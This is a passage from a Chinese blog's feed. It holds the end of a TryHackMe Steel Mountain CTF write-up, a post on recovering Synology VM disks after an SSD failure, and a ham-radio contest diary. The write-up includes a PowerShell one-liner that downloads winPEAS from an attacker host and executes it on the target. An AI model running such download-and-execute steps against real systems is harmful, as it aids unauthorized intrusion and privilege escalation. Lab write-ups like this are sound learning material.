class="line"><span style="color: #ABB2BF">steelmountain\bill</span></span></code></pre></div></div></figure><p>这里题目就要我们用一个叫 <code>winPEAS</code> 的工具来收集系统的信息，用来判断系统的可注入点。我依然用之前起的 Python HTTP 服务端用来传文件。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">powershell </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">c </span><span style="color: #98C379">&quot;Invoke-WebRequest -Uri http://10.11.141.2/winPEASx64.exe -OutFile C:\Users\Public\winPEASx64.exe; C:\Users\Public\winPEASx64.exe&quot;</span></span></code></pre></div></div></figure><img src="/thm_steelmountain/image-20250705014336022.png" class="" title="image-20250705014336022"><p>这个工具能显示的非常非常多，看不过来了都。他意思是让我们利用里面发现的注入点，我懒懒就没有去研究了。</p><p>后面问了一个如何用 PowerShell 获取服务名字，这不是基操吗？</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">powershell </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">c </span><span style="color: #98C379">&quot;Get-Service&quot;</span></span></code></pre></div></div></figure><h2 id="0xff"><a href="#0xff" class="headerlink" title="0xff"></a>0xff</h2><p>做完这个 Room，感觉收获很大，本来这个原文是做的小抄的，但是一下记了挺多东西的，想了想不如写一个 Writeup 了，就有了这篇文章。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x0&quot;&gt;&lt;a href=&quot;#0x0&quot; class=&quot;headerlink&quot; title=&quot;0x0&quot;&gt;&lt;/a&gt;0x0&lt;/h2&gt;&lt;p&gt;Room：&lt;a href=&quot;https://tryhackme.com/room/steelmountain&quot;&gt;https://tr</summary>
      
    
    
    
    <category term="THM" scheme="https://blog.irec.moe/categories/THM/"/>
    
    
    <category term="Windows" scheme="https://blog.irec.moe/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>灵车固态炸了整台群晖</title>
    <link href="https://blog.irec.moe/ssd_boom_dsm.html"/>
    <id>https://blog.irec.moe/ssd_boom_dsm.html</id>
    <published>2025-02-02T16:00:00.000Z</published>
    <updated>2025-07-07T17:19:51.352Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x0-警告"><a href="#0x0-警告" class="headerlink" title="0x0 警告"></a>0x0 警告</h2><p>2024年1月27日早上收到了 NAS 发过来的邮件推送，那时候我还正熟睡，起来之后看到邮件后并没有觉得有什么事情，下午登录进去之后发现 SSD 掉了，那就重启一下吧。</p><img src="/ssd_boom_dsm/photo_2025-01-28_00-29-08.jpg" class="" title="photo_2025-01-28_00-29-08"><p>关机等了一会，给他开机，等了很久很久很久（10min+），还没进系统，接了个 HDMI 采集卡看了一下引导成功了，然后就接到了第一张图的那封邮件。进他的 Web 界面很卡很卡，我在想这是怎么了，SSD 都这么卡吗，然后果断关机。给这块 SSD 接电脑上看了看。</p><h2 id="0x1-硬盘爆炸"><a href="#0x1-硬盘爆炸" class="headerlink" title="0x1 硬盘爆炸"></a>0x1 硬盘爆炸</h2><p>接上电脑用 CDI 看了看他的 SMART，没看到有异常。算了一下 PE 数 74986 &#x2F; 256 ≈ 293 PE，还好？</p><img src="/ssd_boom_dsm/Snipaste_2025-01-27_21-16-11.jpg" class="" title="Snipaste_2025-01-27_21-16-11"><p>然后给整盘做镜像，这时候就发现速度不对了，只有 30M&#x2F;s，那行，等你慢慢做完。</p><img src="/ssd_boom_dsm/Snipaste_2025-01-28_00-24-53.jpg" class="" title="Snipaste_2025-01-28_00-24-53"><p>然后我正好有一块同型号的灵车硬盘，在我的软路由里，拆了他取出来准备做一下克隆，顺便看了一下 SMART 情况，还好。</p><img src="/ssd_boom_dsm/2.jpg" class="" width="2"><h2 id="0x2-尝试保留数据迁移硬盘"><a href="#0x2-尝试保留数据迁移硬盘" class="headerlink" title="0x2 尝试保留数据迁移硬盘"></a>0x2 尝试保留数据迁移硬盘</h2><p>参考了一下网上的教程，想保留数据迁移硬盘，踩坑很多很多，就不详细叙述了，简单总结一下我尝试过的方法。</p><h3 id="使用扇区到扇区对拷硬盘-提示配置丢失，需要重装"><a href="#使用扇区到扇区对拷硬盘-提示配置丢失，需要重装" class="headerlink" title="使用扇区到扇区对拷硬盘 提示配置丢失，需要重装"></a><strong>使用扇区到扇区对拷硬盘 提示配置丢失，需要重装</strong></h3><img src="/ssd_boom_dsm/image-20250223215425780.png" class="" title="image-20250223215425780"><h3 id="使用系统内组-RAID-1-的方法恢复"><a href="#使用系统内组-RAID-1-的方法恢复" class="headerlink" title="使用系统内组 RAID 1 的方法恢复"></a>使用系统内组 RAID 1 的方法恢复</h3><p>单独插另一块做好 RAID 的盘，提示配置丢失，需要重装<br>两块盘一起插，提示配置丢失，需要重装<br>原硬盘盘位不对，提示配置丢失，需要重装<br>单独插原硬盘盘位插回去 提示配置丢失，需要重装<br>单独插原硬盘盘位插回去 拔出其他所有盘，能开机</p><p>在此期间等的时间很久很久，等他同步一次数据和克隆硬盘都要2h以上，那个没坏的硬盘也是个垃圾货。</p><p><strong>这里测试结果不代表不能以这种方式更换系统盘，我猜是因为我那块盘变成只读状态了，导致没法这样操作。</strong></p><h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>还有群晖在硬盘出现问题后会自动触发数据清理，这个时候碰上这种盘根本没法操作任何东西，IO直接爆了。</p><img src="/ssd_boom_dsm/Snipaste_2025-01-28_18-06-46.jpg" class="" title="Snipaste_2025-01-28_18-06-46"><p>在后面系统会直接卡死什么也做不了，所以我要在他开机之后马上去停止掉他这个数据清理。</p><img src="/ssd_boom_dsm/Snipaste_2025-01-28_17-11-23.jpg" class="" title="Snipaste_2025-01-28_17-11-23"><p>直接在存储管理器暂停计划是没有用的，必须要在计划数据清理里面把<strong>启用数据清理计划</strong>的勾去掉，才能关掉他在运行的数据清理。</p><h2 id="0x2-放弃"><a href="#0x2-放弃" class="headerlink" title="0x2 放弃"></a>0x2 放弃</h2><p>在后面直接没办法了，反正所有数据都有备份，直接重装整个 DSM，顺便把引导也更新到了7.2.1，是最后一个官方支持 AME 的版本。</p><h3 id="从群晖系统盘恢复-VMM"><a href="#从群晖系统盘恢复-VMM" class="headerlink" title="从群晖系统盘恢复 VMM"></a>从群晖系统盘恢复 VMM</h3><p>对于我来说，NAS 的作用更多体现在 Server 上，所以我 VMM 上跑了一些虚拟机。Docker 的话则好办，数据目录是分离的并且我也做好了备份，重新拉一下镜像部署一下就恢复了。而 VMM 则麻烦很多，看到 Reddit 的一个帖子 <a href="https://www.reddit.com/r/synology/comments/yi5txz/how_can_i_recover_synology_vms_in_a_disaster/">How can I recover synology VMs in a disaster?</a> 。</p><blockquote><p>There are no real VMM backup solutions, except by backing up all data from inside the VM.</p><p>This makes VMM virtually useless for serious business use.</p></blockquote><p>看到这我瞬间寒心了，然后想了想既然是 VM 那肯定有 VHD。这篇<a href="https://www.reddit.com/r/synology/comments/of2zl8/how_to_migrate_away_from_synology_vmm/">帖子</a>、<a href="https://www.reddit.com/r/synology/comments/sixqn7/in_vmm_can_i_store_different_vhd_on_different/">另一篇</a>有提到 VMM 的虚拟磁盘存放位置。</p><blockquote><p>&#x2F;volume#&#x2F;@iSCSI&#x2F;LUN&#x2F;VDISK_BLUN is the directory that houses the GUIDs…that house the disk files named by UUID.</p></blockquote><p>所以我用 <code>UFS Explorer Professional Recovery</code> ，打开备份出来的的整个硬盘镜像。</p><img src="/ssd_boom_dsm/image-20250223231322434.png" class="" title="image-20250223231322434"><p>可以看到有一个 233G 的 btrfs 分区，打开之后发现根目录都是 Docker 容器生成的文件夹，打开来看亦是。</p><img src="/ssd_boom_dsm/image-20250223231414096.png" class="" title="image-20250223231414096"><p>找到 @iSCSI&#x2F;LUN&#x2F;VDISK_BLUN 打开看发现是空的，然后发现根目录有类似 UUID 一样的文件夹，打开一看，好家伙这不就是么。</p><img src="/ssd_boom_dsm/image-20250223232229059.png" class="" title="image-20250223232229059"><p><code>vdisk.xxxx</code> 静静的躺在里面，导出来一看正是我 VMM 里面虚拟机之一。为什么有那么多是因为我开了快照，里面有不同版本的很多个 <code>vdisk</code>，找了一下把各个虚拟机的修改日期最新的 <code>vidsk</code> 导出来，然后用 V2V 转成 VMDK，再导入新的 VMM 里面（此处省略步骤），完美恢复。</p><img src="/ssd_boom_dsm/image-20250307170458777.png" class="" title="image-20250307170458777"><h2 id="0x3-更换-S3610"><a href="#0x3-更换-S3610" class="headerlink" title="0x3 更换 S3610"></a>0x3 更换 S3610</h2><p>在小黄鱼买了一块 S3710 480G ，花了 180CNY（2025年2月），使用组 RAID1 再降级的方式更换硬盘，参考教程 <a href="https://post.smzdm.com/p/a7nzk209/">五步操作将群晖RAID1阵列降级为Basic模式</a>。</p><img src="/ssd_boom_dsm/Snipaste_2025-02-24_19-33-01.jpg" class="" title="Snipaste_2025-02-24_19-33-01"><p>很顺利，最后手动扩充一下存储池，大功告成。</p><p>剩下的就是一些套件设置和用户恢复了，还好群晖用户数据是放在存储池下的 homes 目录里面，这样迁移机器保留硬盘不会丢数据，只需要重新建立一下用户就行。</p><p>而 Docker 因为我有把单独的数据目录备份，直接 pull 最新的镜像，重新配置一下存储空间和端口映射就完事了。</p><h2 id="0x4-后记"><a href="#0x4-后记" class="headerlink" title="0x4 后记"></a>0x4 后记</h2><p>远离灵车硬盘！远离灵车硬盘！远离灵车硬盘！</p><p>灵车拿来玩玩或是当 Steam 硬盘可以，但是像我这样把他当成主力盘用的话，真的可能就数据火葬场了，这是我第一次碰到在用的硬盘爆炸的，把我折腾不轻（以前是玩坏的，多写几轮直接暴毙那种，坏了就垃圾桶）。</p><p>我的数据都有备份，但是重新配置是真的折磨人。我买 S3610 也是看中了他的传家宝特性，希望能活久一点，不希望再有下一次了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x0-警告&quot;&gt;&lt;a href=&quot;#0x0-警告&quot; class=&quot;headerlink&quot; title=&quot;0x0 警告&quot;&gt;&lt;/a&gt;0x0 警告&lt;/h2&gt;&lt;p&gt;2024年1月27日早上收到了 NAS 发过来的邮件推送，那时候我还正熟睡，起来之后看到邮件后并没有觉得有什</summary>
      
    
    
    
    <category term="硬件" scheme="https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"/>
    
    
    <category term="群晖" scheme="https://blog.irec.moe/tags/%E7%BE%A4%E6%99%96/"/>
    
    <category term="硬盘" scheme="https://blog.irec.moe/tags/%E7%A1%AC%E7%9B%98/"/>
    
    <category term="灵车" scheme="https://blog.irec.moe/tags/%E7%81%B5%E8%BD%A6/"/>
    
  </entry>
  
  <entry>
    <title>BH7FBP 2024 CQWW SSB SOSB LP 10m 比赛记录</title>
    <link href="https://blog.irec.moe/cqwwssb2024.html"/>
    <id>https://blog.irec.moe/cqwwssb2024.html</id>
    <published>2024-12-10T04:00:00.000Z</published>
    <updated>2024-12-10T20:53:34.563Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>2021 年，我接触了业余无线电。但我的实际活动是从今年也就是 2024 年开始的，年初有幸认识到岳阳本地的友台，BG7HTS 送了一根 UV 八木天线，BD7BS 送了两根鱼竿，从此开始我的业余无线电生涯。</p><p>3 月通过 BG6HNY 帮助注册了 QRZ 和 LOTW，4 月开始打星，6 月开始玩短波，按捺不住想拥有一台自己的短波机，托朋友从日本带了一台 IC-7300，对于那时候还是学生的我来说，钱包大出血：(。</p><p>等电台来的路上就是开始研究各种除电台之外的配件咯，看了看市面上成品的配件真的好贵，对于没收入的我来说太贵太贵了。刚好自己喜欢动手，就 DIY 了电池组、GP 天线给短波做准备。电池组是 PDD 砸金蛋 5 折买的力神 40LA，3 串，后面改成 4 串了，折腾过程<a href="https://blog.irec.moe/zhafeilaotie.html">在这里</a>。GP 天线则是 5.6m 的拉杆 + CNC 切的底座 + 高压绝缘子攻丝 + 镀锌管钉 + 16P 软排线 + 香蕉插头插座，里面的就拉杆和软排线最贵，39+12。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/BWnhlmxbquTdNVc.jpg" alt="IMG_20240613_115215" data-caption="IMG_20240613_115215" loading="lazy"></p><p>机器到了之后反而没时间玩了，因为即将毕业，要搞毕设之类的，忙成狗~</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/MrKJUibDQkNvL9y.jpg" alt="mmexport1718364400808" data-caption="mmexport1718364400808" loading="lazy"></p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/HurjbS9h15ivFEt.jpg" alt="IMG_20240614_170025" data-caption="IMG_20240614_170025" loading="lazy"></p><p>上图是最后一次在学校野架。</p><p>后来忙完毕业的事宜，在等待工作的间隙中，一根 GP 天线挂窗台干了 2 个月，拿到了 DXCC 100。</p><p>9 月，接触除 GP 天线之外的天线制作。从成品巴伦+旧电线在自家阳台上架了一个倒 V，被低底噪惊艳到，从此打开了 DP 的大门。第一根正 V 天线利用 BD7BS 送的鱼竿，自己画了一个适配的底座，实战效果很棒。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/eX8qzOiE7umUPvJ.jpg" alt="IMG_20240916_164313" data-caption="IMG_20240916_164313" loading="lazy"></p><p>老是往外跑太折腾人了，就研究端馈天线，计划在两栋楼之间架设。但是看到成品的巴伦太贵，就开始研究巴伦，买了一堆磁环。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/PDljCwKsE2q8GYJ.jpg" alt="IMG_20241014_200949" data-caption="IMG_20241014_200949" loading="lazy"></p><p>同样也是通过 BD7PRC 引导，开始玩 6m ，从 BG7XWF 那里买了一根八木天线，看到了他的做法，准备也用它那种铝管套接 + 管夹的做法来做天线，然后 DIY 了一根 6m - 10m 的正 V 天线，现在仍在阳台服役。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/cLmyEtl317I4Zwr.jpg" alt="IMG_20241019_173035" data-caption="IMG_20241019_173035" loading="lazy"></p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/zhaJGqoQx8Mk4jf.jpg" alt="IMG_20241018_082430" data-caption="IMG_20241018_082430" loading="lazy"></p><p>上图为自己设计的固定底板。</p><p>此次参赛也属于机缘巧合，还是从 BD7PRC 那里得知会举行 SSB 的全球性的比赛，我从来没参加过这种比赛，对我来说很陌生，也充满着挑战性 。比赛不仅对于我这种只在菜市场通联过的人是一种挑战，同时也能锻炼我的能力（事实证明确实真的锻炼到了)。比赛是能很好地检验自己的通讯基础设施和能力的，刚好自己在研究天线，对于我来说是一次很好的锻炼机会。</p><h1 id="备赛期间"><a href="#备赛期间" class="headerlink" title="备赛期间"></a>备赛期间</h1><h2 id="10月20号"><a href="#10月20号" class="headerlink" title="10月20号"></a>10月20号</h2><p>跟我父亲详聊了一下，告诉了他这件事，表示支持并且询问了我需要什么样的场地，我说人烟稀少，场地开阔，远离城市。准备带我去本地的双桥水库，我带了 GP 和 EFHW 去测试一下底噪。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/G3uHUsp6PZl7oFb.jpg" alt="IMG_20241020_151800" data-caption="IMG_20241020_151800" loading="lazy"></p><p>实际上测试效果还可以，这是用 GP 天线测出来的底噪，P2 指的是 2 级前放，OVF 指的是过载，可能是附近有强干扰源。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">160m P2 S0</span></span><span class="line"><span style="color: #abb2bf">80m P2 S3</span></span><span class="line"><span style="color: #abb2bf">40m P2 S4</span></span><span class="line"><span style="color: #abb2bf">30m S3</span></span><span class="line"><span style="color: #abb2bf">20m S5</span></span><span class="line"><span style="color: #abb2bf">17m S2</span></span><span class="line"><span style="color: #abb2bf">15m S4 OVF</span></span><span class="line"><span style="color: #abb2bf">12m P2 S3 OVF</span></span><span class="line"><span style="color: #abb2bf">10m P2 S2 OVF</span></span><span class="line"><span style="color: #abb2bf">6m P2 S0</span></span></code></pre></div></div></figure><p>把 GP 架起来做了几个 QSO，通联了 BD3UDA、BD7NIG、BD4QB、BI8FRF、BD4UBG 几位老师，收他们的信号都非常好，全部都是 59，他们给我的信号报告从 59 到 45，感觉还可以，通联的比较顺利没有拉扯。</p><p>后来去水库旁边的堤坝上面架了一个端馈天线，挂了一下 FT8 ，玩了玩自己在家玩不了的 40m 波段，测试起来效果一般，振子线偏长了，另外架设高度也偏低，只有 15m 波段驻波比较好。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/DzpoLNnjZtEJ7M6.jpg" alt="IMG_20241020_165400" data-caption="IMG_20241020_165400" loading="lazy"></p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/7ecGlPxVD4MvETj.jpg" alt="IMG_20241020_173517" data-caption="IMG_20241020_173517" loading="lazy"></p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/KYaw6USFGcqVZRe.jpg" alt="IMG_20241020_175602" data-caption="IMG_20241020_175602" loading="lazy"></p><p>太阳消失，妖风作祟，正好母亲打电话来了，收拾战场回家。</p><p>坐摩托回去的路上被风吹得头疼，在抉择是否参加这次比赛，如果我真的参加的话，对于我来说太艰苦了，再加上天气也不好，搞的人生病了就不好说了。回去和母亲说了一下，母亲说要不去他同事家里，有电有水有饭吃，那我一拍即合。行，麻烦了。第一次用正 V 天线野架就是在那边，底噪很优秀，就是路不太好走。</p><h2 id="10月21号"><a href="#10月21号" class="headerlink" title="10月21号"></a>10月21号</h2><p>去 BA5CW 的网站和 HelloCQ 论坛上看了看前辈们的参赛经验以及注意事项，阅读了 CQWW SSB 的比赛规则，参考了 <a href="https://yuluoxk.cn/n1mmlogger/">BG2FFJ 的教程</a> 把电脑的 N1MM 配好，之后越想越不对，我套天馈参加比赛是否有点太烂了，现有的只有 EFHW、GP、DP 这三种类型的天线，想整个 2 单元的八木，去老外的网站上看了看相关的文章，突然在 POTA 群 BG2BFG 发了一张图。<img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/fdGTJKIqiPYwyA5.jpg" alt="image-20241207010522021" data-caption="image-20241207010522021" loading="lazy"></p><p>这是 BG8AMG 设计的用拉杆天线做的八木，我看了看视频，里面绝大部分的配件我有，就意味着我可以用非常小的开支造一条能用的八木天线出来，然后拟定了一张 BOM 表。</p><table><thead><tr><th>名称</th><th>数量</th><th>价格</th></tr></thead><tbody><tr><td>型材 2020 1.8mm厚 1m长</td><td>2</td><td>18.82</td></tr><tr><td>双头内螺纹圆柱 18 * 30 * M10</td><td>1</td><td>0.27</td></tr><tr><td>铝型材一字连接件 欧标20型-M5+顶丝4个</td><td>4</td><td>3.01</td></tr><tr><td>304滑块 欧标 20-M6</td><td>5</td><td>1.56</td></tr><tr><td>内六角螺丝 M6*10</td><td>10</td><td>0.52</td></tr><tr><td>骑马扣 18φ</td><td>5</td><td>0.56</td></tr><tr><td>骑马扣 40φ</td><td>5</td><td>2.97</td></tr><tr><td>拉杆 5.6m</td><td>1</td><td>47.53</td></tr><tr><td></td><td></td><td></td></tr><tr><td>以下为现有的</td><td></td><td></td></tr><tr><td>巴伦 1:1</td><td>1</td><td></td></tr><tr><td>拉杆 5.6m</td><td>3</td><td></td></tr><tr><td>绝缘子 40φ</td><td>1</td><td></td></tr></tbody></table><p>之后在淘宝上火速下单，等待到货，另外还买了个蛋卷桌~</p><h2 id="10月22号-10月25号"><a href="#10月22号-10月25号" class="headerlink" title="10月22号-10月25号"></a>10月22号-10月25号</h2><p>这期间在通过 FT8 研究传播规律，最终波段敲定 10m，因为传播也很有规律，早上6点30左右太阳快出来的时候传播逐渐变强，中午远距离 DX 消失，到傍晚又渐强，直到深夜只有几个稀稀拉拉的信号。</p><p>多波段就不参与了，这样能保证有足够的时间休息，刚开始还是不要搞强度那么大，怕身体吃不消。后续证明我选择也对了，10m 传播爆了。</p><p>10月23日，通过 BG7JAF 的指导，用之前断掉的镀银馈线做了一个 1:1 的电流型巴伦，测试出来的指标很好。</p><p>买的馈线和 M 头也到了，可恶的卖家少发了一个 M 头，还好我还有一个，正好用上了。</p><p>在10月23号的时候，感觉买的铝型材到不了了，卖家还没发货，遂跟父亲说了这件事，让他带我去当地的建材市场去找找有没有卖的，俩人寻觅了2小时，无功而返。然后在网上买了另一家的型材。好在快递给力，在最后一天（10月25日）的下午，到货了，到家试着组装了一下，可行！</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/bRBZjY7UXmswvrK.jpg" alt="IMG_20241025_164513" data-caption="IMG_20241025_164513" loading="lazy"></p><h2 id="比赛前夜"><a href="#比赛前夜" class="headerlink" title="比赛前夜"></a>比赛前夜</h2><p>仔细阅读了一下比赛规则，再次确认软件配置没问题。</p><p>和母亲联系好他同事，约定好第二天早上6点出发，自己则准备好要带的各种东西，担心那边没排插用，从家里找了一堆排插，甚至连 16A 的空调延长线也带上了，加了一个米家的空调伴侣 Pro，因为那上面有 10A 的插口，就这样带了一大袋的排插。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/n2T1chtfR5lSzBy.jpg" alt="IMG_20241025_180811" data-caption="IMG_20241025_180811" loading="lazy"></p><p>对这次比赛还特意准备了风绳，地钉是用之前做 GP 天线剩下的9.9元10根的管钉 + M10 的吊环螺母做的地钉，算是废物利用了，以下是比赛准备的东西列表。</p><p>主要</p><ul><li>IC-7300</li><li>笔记本电脑</li><li>华为服务器电源 + 电源线</li><li>XT60 转 ICOM 口电源线 2 根</li></ul><p>天线</p><ul><li>20m EFHW</li><li>2el 拉杆 Yagi</li><li>GP（Yagi 可变成 GP）</li><li>1:1 巴伦 3 个</li><li>1:49 巴伦 1 个</li></ul><p>其他</p><ul><li>手电钻</li><li>绳子 50m</li><li>地钉 4个</li><li>扎带</li><li>剪刀</li><li>一些备用的金属件</li></ul><p>有没有发现少了什么，一个非常重要的东西，后文再做叙述。</p><h1 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h1><h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>6点出发，7点到达目的地的河边，等待开船来接我。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/hO5xoFq4cuVX7eD.jpg" alt="1733509319279" data-caption="1733509319279" loading="lazy"></p><p>7 点 30 到达对岸，开始领域展开，发现手咪没带！赶紧联系母亲，在我的床脚下找到了手咪，问我怎么办，有没有其他办法，我说没办法。想过通过电脑的麦克风转到 ICOM 的声卡的音频输入进去，可行是可行，但是 PTT 控制有点灵车。母亲说搭摩托给我送过来，这可是有接近 10km 呢，真的感谢她。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/dDWGB6SkXpjUzlV.jpg" alt="Screenshot_2024-12-11-03-16-35-06_e39d2c7de19156b0683cd93e8735f348" data-caption="Screenshot_2024-12-11-03-16-35-06_e39d2c7de19156b0683cd93e8735f348" loading="lazy"></p><p>之后呢，就忙着天线架设，按图纸的数据把拉杆扯到了指定的长度，但是谐振点不对，之后就对着天分调，最终调下来了。之后搞风绳的时候差点 QBG，应该先把支撑杆搞好再打风绳的，没拉过风绳经验不足吃亏了，还好天线没多重，稳住了。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/UAgiOTZMx4DsfYP.jpg" alt="1733509398946" data-caption="1733509398946" loading="lazy"></p><p>一切准备好已经8点15分了，这时手咪也送到了，好感谢我的母亲，没有他这次比赛就泡汤了。</p><h3 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h3><p>打开电台，频率上密密麻麻的信号，找了几个频率守听发现怎么听都别扭，记得之前看的文章有老师说过，有些台不喜欢用标准频率，会偏一点，点了一下频率的末尾的两个蛋，随后转波轮，这下声音才正常。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/lhQkUBP9T8RsAGH.jpg" alt="1733509431457" data-caption="1733509431457" loading="lazy"></p><p>随之最困难的就出现了，我听不懂，是真的听不懂，报的字母解释法貌似是非标的，另外在 pileup 中主叫台主叫的时间也很少，让我听他们的呼号时间很少很少，通联的第一个台是 E20PFE，也算是破处了。随后就是听呼号，然后呼叫，刚开始速率是真的慢，因为一个呼号我要听 5 次以上才听的明白，尽管利用了 N1MM 的猜呼号功能，速率仍然提不上去。</p><p>在接触了 2 小时之后，经历了各种怀疑人生，渐渐 get 到了味道，能 2-3 遍听明白呼号，速率也提上来了。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/RO8umgBdJf9Yl4I.jpg" alt="image-20241207015046949" data-caption="image-20241207015046949" loading="lazy"></p><p>通联的电台大部分都是亚洲和东南亚电台，在10点07分的时候通联到了第一个北美电台 ND7K，10点57分 KW7MM，11点54分 PX2A。此外都是亚洲和东南亚的台。</p><p>下午1点19分，第一个欧洲电台 OM2VL 出现！</p><p>叫吃饭了，才取下耳机，发现耳鸣了。随便解决了午饭一下回到了电台前面继续干台，下午传播并不给力，都是 JA，并且速度也提不上去，起身活动了一下身子才发现腰酸背痛伴随着耳鸣头晕，有点想放弃比赛的感觉。</p><p>同时天线也转了一下，转到了 60 度，早上是 260 度。感觉  JA 信号强了很多。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/ib1R9aOTxtq4Xwf.jpg" alt="1733509489454" data-caption="1733509489454" loading="lazy"></p><p>稍微休息了一阵，把端馈天线架起来了，测试了一下接受效果并不理想，继续用八木干亚洲台。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/hgAz52cYZ1qm6U4.jpg" alt="1733509489468" data-caption="1733509489468" loading="lazy"></p><p>后面没啥台干，随即下机，撸猫<del>休息够了就继续扫地</del></p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/PRLYu9K8UtT3Hhk.jpg" alt="IMG_20240921_174745" data-caption="IMG_20240921_174745" loading="lazy"></p><p>太阳落山之后的时候欧洲传播开了，狠狠恰了一波系数分。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/Y8crymap7SGzuWV.jpg" alt="image-20241207020544901" data-caption="image-20241207020544901" loading="lazy"></p><p>回过头看其实这段时间应该提速的，因为自己的弱抄收能力浪费了很多时间，那也没办法，毕竟第一次。</p><p>家人怕我冷，临时给我搭了个帐篷，晚上就睡在这里，还挺舒服的，有点享受这种感觉。晚上下了毛毛雨，看天气预报明天是阴天，感觉传播会变差。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/4Zqxa2HkjJy5bOi.jpg" alt="IMG_20241026_213922" data-caption="IMG_20241026_213922" loading="lazy"></p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/fMGObKN8TkPDjF4.jpg" alt="IMG_20241026_214122" data-caption="IMG_20241026_214122" loading="lazy"></p><p>在晚上的时候就在研究，看到他们有那个本地 bandmap 功能，刚开始以为这样做会违反规则，但是实际上是参加无辅助组的不能把自己的 spot 信息发出去，这个功能并不违反规则。唉，吃了没经验的亏啊。配置好了这个功能扫地还是很舒服的，给第二天的扫地上了大分。</p><p>传播到晚上 10 点差不多就结束了，仅有的几个 JA 和 HS 大台还有信号，一个最令我印象深刻的是 DY1O，在晚上大台基本上听不清的情况下，他信号过来 59+20 打雷一样。看了一下他的 QRZ 主页说的是 <strong>KILOWATTS ARE NEVER ENOUGH</strong>，哈哈，估计都是秃头佬（x</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/fuDOhRMBF91PH8E.jpg" alt="image-20241207021717009" data-caption="image-20241207021717009" loading="lazy"></p><p>第一天以 82个 QSO 结束，之后就切换到端馈天线看了看其他波段的传播，试着 SSB 喊了一下不回我，小功率 + 低效率天线还是不行啊。后面无聊看看群，BD7PRC 传来捷报，说我的波段选对了，今天 10m 的传播非常好。晚上就挂挂 FT8，和几个老朋友成功在 40m 通联上了。</p><h2 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h2><p>晚上其实并没有多睡，晚上是挂着 10m 的 FT8 守听的，3点30分起来看了一下没传播，6点30分起来的时候看到一屏幕的 JA，甚至开了美国。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/NVKAv3GhoMayYCX.jpg" alt="IMG_20241027_064856" data-caption="IMG_20241027_064856" loading="lazy"></p><p>起床洗漱了一下，做了几个 QSO 之后就被叫去吃早餐了，下了一晚上的小雨，外面雾蒙蒙的，感觉今天要寄了。</p><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s2.loli.net/2024/12/11/91CNJfvPbm2Y3zc.jpg" alt="IMG_20241027_064850" 